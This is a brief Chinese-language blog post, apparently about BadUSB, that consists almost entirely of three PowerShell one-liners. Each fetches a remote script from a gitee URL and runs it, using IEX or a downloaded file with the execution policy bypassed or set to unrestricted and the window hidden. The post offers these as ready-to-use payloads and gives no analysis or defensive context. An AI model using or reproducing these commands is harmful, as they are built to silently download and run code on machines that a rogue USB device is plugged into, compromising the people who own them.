---
layout: post
title: "powershell项目"
description: "通过badusb"
date: 2020-05-24
tags: [learn,project]
comments: true
share: true
---

```powershell
远程运行
cmd.exe /c powershell -c "IEX(New-Object Net.WebClient).DownloadString('https://gitee.com/hkslover/blog_img/raw/master/file/demo.ps1')"

下载并Bypass隐藏运行
cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('https://gitee.com/hkslover/blog_img/raw/master/file/demo.ps1','1.ps1')&powershell -ExecutionPolicy bypass -File ./1.ps1

下载并Unrestricted执行策略并隐藏运行
cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('https://gitee.com/hkslover/blog_img/raw/master/file/demo.ps1','1.ps1')&powershell -ExecutionPolicy unrestricted -File ./1.ps1
```

**后续有板子后再更新**
